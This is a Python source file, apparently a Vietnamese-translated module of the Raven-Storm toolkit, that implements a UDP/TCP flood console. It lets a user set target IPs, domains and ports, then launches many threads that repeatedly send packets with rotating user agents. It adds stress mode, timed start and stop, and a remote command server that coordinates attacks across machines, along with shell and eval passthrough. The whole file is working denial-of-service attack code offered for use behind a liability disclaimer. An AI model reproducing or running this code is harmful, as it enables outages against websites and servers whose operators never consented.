# 2020
# Bộ công cụ Raven-Storm được lập trình và phát triển bởi Taguar258.
# Bộ công cụ Raven-Storm được xuất bản theo Giấy phép MIT.
# Bộ công cụ Raven-Storm dựa trên CLIF-Framework.
# CLIF-Framework được lập trình và phát triển bởi Taguar258.
# CLIF-Framework được xuất bản theo Giấy phép MIT.

import socket
from os import getcwd, name, path, system
from random import choice
from sys import version
from threading import Thread
from time import sleep, time

import requests
from CLIF_Framework.framework import event, tools  # noqa: I900

event = event()
tools = tools()


class Main:
	def __init__(selfie, console):  # noqa: N805
		global self
		global var
		self = selfie
		var = console  # noqa: VNE002

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.port = [80]  # Port 80 protocol == TCP
		var.threads = 160
		var.ip = [""]
		var.socketmethod = "TCP"  # / UDP
		var.sleep = 0
		var.outtxt = True
		var.outtxtmute = False
		var.message = "hey, it's me rs."
		var.messagezw = var.message
		var.rtxt = 1
		var.stress = False
		var.timeforstress = 1
		var.autostart = 0
		var.autostop = 0
		var.autostep = 0
		var.autostarttime = 0  # Will be used as a variable for autostop
		var.runactive = True
		var.get_url = ""

		var.l4_debug = False
		var.stoped_threads = 0

		var.user_agents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00", "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0", "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01", "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5"]

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.commands(self.show_values, ["values", "ls"])

		event.help_comment("|\n|-- Các lệnh chính:")
		event.help("port", "Đặt cổng của mục tiêu.")
		event.help("threads", "Đặt số lượng chủ đề.")
		event.help("ip", "Đặt IP của mục tiêu.")
		event.help("web", "Nhắm mục tiêu ip của một miền.")
		event.help("method", "Thay đổi phương thức tấn công giữa UDP, TCP.")
		event.help("sleep", "Đặt thời gian trễ giữa mỗi lần gửi gói.")
		event.help("outtxt", "Xuất từng gói tin trạng thái gửi: bật / tắt.")
		event.help("mute", "Không xuất ra câu trả lời kết nối.")
		event.help(["values", "ls"], "Hiển thị tất cả các tùy chọn đã chọn.")
		event.help("run", "Bắt đầu cuộc tấn công.")
		event.help_comment("|\n|-- Đặt văn bản gửi:")
		event.help("message", "Đặt thông điệp của packt.")
		event.help("repeat", "Lặp lại thông điệp của mục tiêu thời gian cụ thể.")
		event.help("mb", "Gửi số lượng gói MB cụ thể đến máy chủ.")
		event.help("get", "Xác định GET Header.")
		event.help("agent", "Xác định một tác nhân người dùng thay vì một tác nhân ngẫu nhiên.")
		event.help_comment("|\n|-- Bài kiểm tra về áp lực:")
		event.help("stress", "Bật chế độ kiểm tra mức độ căng thẳng.")
		event.help("st wait", "Đặt thời gian giữa mỗi mức độ căng thẳng.")
		event.help_comment("|\n|-- Nhiều:")
		event.help("ips", "Đặt nhiều ips để nhắm mục tiêu.")
		event.help("webs", "Đặt nhiều miền để nhắm mục tiêu.")
		event.help("ports", "Tấn công nhiều cổng.")
		event.help_comment("|\n|-- Tự động hóa:")
		event.help("auto start", "Đặt thời gian trễ trước khi cuộc tấn công bắt đầu.")
		event.help("auto step", "Đặt thời gian trễ giữa luồng tiếp theo để kích hoạt.")
		event.help("auto stop", "Đặt thời gian trễ sau khi cuộc tấn công dừng lại.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
NGƯỜI SÁNG TẠO KHÔNG CHỊU BẤT CỨ TRÁCH NHIỆM NÀO VỀ THIỆT HẠI GÂY RA.
NGƯỜI DÙNG CŨNG PHẢI CHỊU TRÁCH NHIỆM
ĐỂ PHÙ HỢP VỚI CÁC MỤC ĐÍCH BẤT HỢP PHÁP HOẶC THIỆT HẠI TAI NẠN DO BÃO RAVEN gây ra.
BẰNG CÁCH SỬ DỤNG PHẦN MỀM NÀY, BẠN PHẢI ĐỒNG Ý CHỊU TRÁCH NHIỆM ĐẦY ĐỦ
ĐỐI VỚI BẤT KỲ THIỆT HẠI NÀO DO RAVEN-STORM gây ra.
MỌI Đòn tấn công SẼ gây ra THIỆT HẠI TẠM THỜI NHƯNG THIỆT HẠI DÀI HẠN LÀ
CÓ KHẢ NĂNG ĐÚNG CÁCH.
RAVEN-STORM KHÔNG NÊN ĐỀ XUẤT NHỮNG NGƯỜI THỰC HIỆN CÁC HOẠT ĐỘNG BẤT HỢP PHÁP.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("Chúc một ngày tốt lành.")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("Nhập lệnh shell: ", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("Nhập lệnh gỡ lỗi: ", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("Lệnh bạn đã nhập không tồn tại.")
		print("")

	def check_session(self):
		if var.session[1][0] and len(var.session[1][1]) >= 1:
			if len(var.session[1][1][0]) >= 1:
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			else:
				var.session[1][1] = var.session[1][1][1:]
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			var.run_command = run_following

	@event.event
	def on_input():
		self.check_session()
		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
				if data != "500":
					var.server[4] = var.server[4] + 1
					var.run_command = [data, data]
					print(var.ps1 + "\r")
					break
				else:
					sleep(1)

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	@event.event
	def on_command(command):
		if var.session[0][0]:
			var.session[0][1].write(command + "\n")
		if var.server[0] and var.server[1]:
			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
			if status != "200":
				print("")
				print("Đã xảy ra lỗi khi gửi lệnh tới máy chủ.")
				print("")

	@event.command
	def debug():
		var.l4_debug = True
		print("")
		print("Đã bật chế độ gỡ lỗi.")
		print("")

	def help(self):
		event.help_title("\x1b[1;39mUDP/TCP Flood Help:\x1b[0;39m")
		tools.help("|   |-- ", " :: ", event)
		print("")

	@event.command
	def port(command):
		print("")
		try:
			var.port = [int(tools.arg("Port: ", "port ", command))]
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print("")

	@event.command
	def threads(command):
		print("")
		try:
			var.threads = int(tools.arg("Threads: ", "threads ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print("")

	@event.command
	def ip(command):
		print("")
		var.ip = [tools.arg("Target: ", "ip ", command)]
		if "." not in var.ip[0]:
			print("IP này không tồn tại.")
		print("")

	@event.command
	def web(command):
		print(" ")
		try:
			webtoip = tools.arg("Website: ", "web ", command)
			webtoip = webtoip.replace("http://", "")
			webtoip = webtoip.replace("https://", "")
			webtoiptxt = str(socket.gethostbyname(webtoip))
			var.ip = [webtoiptxt]
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def method(command):
		print("")
		if var.socketmethod == "TCP":
			var.socketmethod = "UDP"
			print("Đã thay đổi phương thức thành UDP.")
		else:
			var.socketmethod = "TCP"
			print("Đã thay đổi phương thức thành TCP.")
		print("")

	@event.command
	def sleep(command):
		print("")
		try:
			var.sleep = int(tools.arg("Độ trễ trong vài giây: ", "sleep ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print("")

	@event.command
	def outtxt(command):
		print(" ")
		if var.outtxt:
			print("Sản lượng đã bị giảm.")
			var.outtxt = False
		else:
			print("Đầu ra đã được đặt thành bình thường.")
			var.outtxt = True
		print(" ")

	@event.command
	def mute(command):
		print(" ")
		if var.outtxtmute:
			print("Đầu ra đã bị vô hiệu hóa.")
			var.outtxtmute = False
		else:
			print("Đầu ra đã bị vô hiệu hóa.")
			var.outtxtmute = True
		print(" ")

	@event.command
	def message(command):
		print("")
		var.message = tools.arg("Message: ", "message ", command)
		var.rtxt = 1
		print("")

	@event.command
	def get(command):
		print("")
		var.get_url = tools.arg("NHẬN Tiêu đề: ", "get ", command)
		print("")

	@event.command
	def repeat(command):
		print(" ")
		try:
			rtxtzw = var.rtxt
			var.rtxt = int(tools.arg("Lặp lại tin nhắn x lần: ", "repeat ", command))
			if var.rtxt < 1:
				print("Đã xảy ra lỗi khi thực thi.")
			else:
				if rtxtzw < var.rtxt:
					var.messagezw = var.message
					var.message = (str(var.message) * int(var.rtxt))
				else:
					var.message = (str(var.messagezw) * int(var.rtxt))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def mb(command):
		print(" ")
		try:
			setmb = int(tools.arg("Kích thước của gói tính bằng MB: ", "mb ", command))
			setmb = int(setmb / 0.000001)
			var.message = ("r" * setmb)
			var.rtxt = setmb
			var.messagezw = "r"
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def stress(command):
		print(" ")
		if var.stress:
			print("Chế độ căng thẳng đã bị tắt.")
			var.stress = False
		else:
			print("Chế độ căng thẳng đã được bật.")
			var.stress = True
		print(" ")

	@event.command
	def st_wait(command):
		print("")
		try:
			var.timeforstress = int(tools.arg("Độ trễ trong vài giây: ", "st wait ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print("")

	@event.command
	def ips(command):
		print("")
		var.ip = tools.arg("Targets (Seperated by ', '): ", "ips ", command).split(", ")
		for ip in var.target:
			if "." not in ip:
				print("IP này không tồn tại.")
		print("")

	@event.command
	def ports(command):
		print("")
		try:
			var.port = tools.arg("Ports (Seperated by ', '): ", "ports ", command).split(", ")
			for port in var.port:
				if isinstance(port, int):
					print("Không thể sử dụng các cổng đã nhập.")
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print("")

	@event.command
	def webs(command):
		print(" ")
		try:
			webtoip = tools.arg("Websites (Seperated by ', '): ", "webs ", command).split(", ")
			for pos, web in enumerate(webtoip):
				webtoip[pos] = web.replace("http://", "")
				webtoip[pos] = webtoip[pos].replace("https://", "")
				webtoip[pos] = str(socket.gethostbyname(webtoip[pos]))
			var.ip = webtoip
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def auto_step(command):
		print(" ")
		try:
			var.autostep = int(tools.arg("Độ trễ để chuỗi tiếp theo kích hoạt (tính bằng Giây): ", "auto step ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def auto_start(command):
		print(" ")
		try:
			var.autostart = int(tools.arg("Độ trễ để cuộc tấn công bắt đầu (tính bằng Giây): ", "auto start ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def auto_stop(command):
		print(" ")
		try:
			var.autostop = int(tools.arg("Dừng đòn sau x giây: ", "auto stop ", command))
		except Exception as e:
			print("Đã xảy ra lỗi khi thực thi.", e)
		print(" ")

	@event.command
	def agent(command):
		print(" ")
		var.user_agents = [tools.arg("Nhập tác nhân người dùng: ", "agent ", command)]
		print(" ")

	def show_values(self):
		print("")
		print("Ports: %s" % var.port)
		print("Threads: %s" % var.threads)
		print("Targets: %s" % var.ip)
		print("Method: %s" % var.socketmethod)
		print("Time between each packet: %s" % var.sleep)
		print("Output: %s" % var.outtxt)
		print("Muted: %s" % var.outtxtmute)
		print("Packet message: %s" % var.message[:15])
		print("Repeat packet text: %s" % var.rtxt)
		print("Stress-Test mode: %s" % var.stress)
		print("Stress-Test level duration: %s" % var.timeforstress)
		print("Start Delay: %s" % var.autostart)
		print("Stop after x seconds: %s" % var.autostop)
		print("Time between threads: %s" % var.autostep)
		if len(var.user_agents) == 1:
			print("Đại lý người dùng: %s" % var.user_agents[0])
		if var.get_url != "":
			print("NHẬN Tiêu đề: %s" % var.get_url)
		print("")

	def stresstest(self):
		print(" ")
		print("Thời gian giữa: %s" % str(var.timeforstress))
		print("Sử dụng %s chủ đề mỗi vòng" % str(var.threads))
		print("To stop the attack press: CTRL + C")
		print(" ")
		sleep(2)
		while True:
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
				except Exception:
					print("\x1b[0;39mKhông thể bắt đầu một chủ đề.")
			sleep(var.timeforstress)
			if var.stresserror:
				print(" ")
				print("Đã dừng ở %s chủ đề!" % (str(var.stresstestvar * var.threads)))
				print(" ")
				var.runactive = False
				quit()
			else:
				var.stresstestvar += 1

	def ddos(self):
		mesalready = False
		if var.get_url == "":
			var.get_url = var.ip
		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n\r\n" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
		if not var.outtxtmute:
			print("Chủ đề đã bắt đầu!")
		if var.socketmethod == "UDP":
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		else:
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while var.runactive:
			for ipvalue in var.ip:
				for portvalue in var.port:
					try:
						if var.socketmethod == "TCP":
							mysocket.connect((ipvalue, portvalue))
						else:
							try:
								mysocket.bind((ipvalue, portvalue))
							except Exception:
								pass
						if var.socketmethod == "TCP":
							mysocket.send(packet)
						try:
							mysocket.sendto(packet, (ipvalue, portvalue))
						except Exception:
							mysocket.send(packet)
						if var.outtxt:
							if not mesalready:
								mesalready = True
								print("\nThành công cho %s với cổng %s!" % (ipvalue, portvalue))
						# sleep(sleepy)
						var.command_log.append("Sucessful execution.")
					except socket.error as ex:
						if not var.outtxtmute:
							mesalready = False
							print("\nNhắm mục tiêu %s với cổng %s không chấp nhận yêu cầu!" % (ipvalue, portvalue))
						var.command_log.append("ERROR: %s" % ex)
						if var.l4_debug:
							print("ERROR: %s" % ex)
						if var.stress:
							var.stresserror = True
						if var.socketmethod == "TCP":
							try:
								mysocket.close()
							except Exception:
								pass

			if int(var.autostop) != 0:
				autoendtime = time()
				autotimer = (int(autoendtime) - int(var.autostarttime))
				if var.autostop <= autotimer:
					print("\x1b[0;39mAuto Stop")
					var.runactive = False
					quit()
		var.stoped_threads += 1

	@event.command
	def run(command):
		print("")
		if var.ip != "":
			def execute():
				print("")
				print("Để dừng cuộc tấn công, nhấn: ENTER hoặc CTRL + C")
				sleep(3)
				sleep(var.autostart)
				if var.stress:
					if len(var.target) == 1 and len(var.port) == 1:
						self.stresstest()
					else:
						print("Không sử dụng nhiều mục tiêu/cổng trong chế độ Kiểm tra căng thẳng.")
				else:  # Normal Mode
					if var.autostop != 0:
						var.autostarttime = time()
					for thread in range(var.threads):
						try:
							t = Thread(target=self.ddos)
							sleep(var.autostep)
							t.start()
						except Exception:
							print("Không thể bắt đầu chuỗi %s." % thread)

				def reset_attack():
					print("Đang dừng chuỗi...")
					var.runactive = False
					sleep(2)
					while True:
						if var.stoped_threads == var.threads:
							break
						else:
							sleep(1)

					if var.l4_debug:
						print("Lưu nhật ký gỡ lỗi...")
						output_to = path.join(getcwd(), "l4_debug_log.txt")

						write_method = "a"
						if path.isfile(output_to):
							write_method = "a"
						else:
							write_method = "w"

						output_file = open(output_to, write_method)
						if write_method == "a":
							output_file.write("------------- New Log -------------")
						output_file.write(str(name + "\n"))
						output_file.write(str(version + "\n"))
						output_file.write(str("\n".join(var.command_log)))
						output_file.close()
					print("Done.")
					quit()

				def check_stopped_execution():
					while True:
						data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
						if data != "True":
							reset_attack()
							break
						else:
							sleep(1)
				try:
					if var.server[0] and var.server[0]:
						rec_t = Thread(target=check_stopped_execution)
						rec_t.start()
					input("\r")
				except KeyboardInterrupt:
					pass

				if var.server[0] and var.server[1]:
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
					if status != "200":
						print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")

				reset_attack()

			if var.server[0] and not var.server[1]:
				while True:
					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
					if data == "True":
						execute()
						break
					else:
						sleep(1)
			elif not tools.question("\nBạn có đồng ý với các điều khoản sử dụng không?"):
				print("Thỏa thuận không được chấp nhận.")
				quit()
			else:
				if var.server[0] and var.server[1]:
					if tools.question("\nBạn có muốn sử dụng máy chủ lưu trữ như một phần của ddos ​​không?"):
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
						if status != "200":
							print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
						execute()
					else:
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
						if status != "200":
							print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
						try:
							print("[Nhấn Enter để dừng cuộc tấn công.]")
						except KeyboardInterrupt:
							pass
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
						if status != "200":
							print("Đã xảy ra lỗi khi gửi dữ liệu đến máy chủ.")
				else:
					execute()
		else:
			print("Không có mục tiêu đã được xác định.")
		print("")


def setup(console):
	console.ps1 = "L4> "
	console.add(Main(console), event)
